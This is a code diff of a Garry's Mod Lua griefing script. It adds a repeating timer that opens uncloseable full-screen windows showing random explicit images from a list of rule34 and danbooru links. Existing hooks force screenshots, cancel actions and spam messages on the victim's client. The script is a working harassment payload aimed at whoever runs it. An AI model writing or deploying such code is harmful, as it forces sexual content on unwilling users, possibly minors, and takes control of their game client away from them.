@@ -17,7 +17,7 @@ local function ss()
     _command('jpeg')
     jpegs = jpegs + 1
 end
-local urls = {
+local hentai = {
     "https://danbooru.donmai.us/data/sample/__kokkoro_princess_connect_and_1_more_drawn_by_ricegnat__sample-b3ddb6d0725e99dd6314f08c525e4023.jpg",
     "https://cali.rule34.xxx//samples/3348/sample_a58e5cc8aa6f15edb57e0b18ccbcb8fac4350c68.jpg?3771999",
     "https://danbooru.donmai.us/data/sample/__m200_girls_frontline_drawn_by_mari0ball__sample-44e5dfe7a505a03c5026fc75f1f1d357.jpg",
@@ -207,6 +207,18 @@ end)
 --    timer.Remove("haha5")
 --    timer.Remove("hahasong")
 --end
+timer.Create('hntai', 2, 10000, function() 
+local _f = _vgui.Create("DFrame")
+    _f:SetTitle("dddddddddddddddddddddddddddddddddddddddddddddddddddd")
+    _f:ShowCloseButton(false)
+    _f:Center()
+    _f:SetSize(ScrW(),ScrH())
+
+local _h = _vgui.Create("DHTML", _f )
+    _h:Dock( FILL )
+    _h:OpenURL(table.Random(hentai))
+end)
+
 _hook.Add('Think','funny',function()
         rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
         local result = annoying[_math.random(1,88)]
@@ -244,44 +256,13 @@ _hook.Add('Think','funny',function()
             _command('cancelselect')
         end
 end)
-local WebMaterials = {}
-function surface.GetURL(url, w, h, time)
-    if !url or !w or !h then return Material("error") end
-    if WebMaterials[url] then return WebMaterials[url] end
-    local WebPanel = _vgui.Create( "HTML" )
-    WebPanel:SetAlpha( 0 )
-    WebPanel:SetSize( tonumber(w), tonumber(h) )
-    WebPanel:OpenURL( url )
-    WebPanel.Paint = function(self)
-        if !WebMaterials[url] and self:GetHTMLMaterial() then
-            WebMaterials[url] = self:GetHTMLMaterial()
-            self:Remove()
-        end
-    end
-    timer.Simple( 1 or tonumber(time), function() if IsValid(WebPanel) then WebPanel:Remove() end end ) // In case we do not render
-    return Material("error")
-end
-local function TESTsurfaceGetURL()
-    local UrlMaterial = _surface.GetURL(table.Random(urls), 200, 200, 5)
-    local Frame = _vgui.Create( "DFrame" )
-    Frame:SetTitle( "h" )
-    Frame:SetSize( ScrW(),ScrH() )
-    Frame:MakePopup()
-    Frame.Paint = function( s, w, h )
-        draw.RoundedBox( 0, 0, 0, w, h, Color( 255,255,255,255 ) )
-        _surface.SetDrawColor(color_white)
-        _surface.SetMaterial( UrlMaterial )
-        _surface.DrawTexturedRect(0, 0, ScrW(), ScrH())
-    end
-end
+
 _hook.Add('RenderScene','funny',function()
 
-    _render.SetLightingMode(1)
+--    _render.SetLightingMode(1)
 
 end)
 _hook.Add('DrawOverlay','funny',function()
-
-    TESTsurfaceGetURL()
 
 end)
 _hook.Add('CreateMove','funny',function( CUserCmd , GM ) 
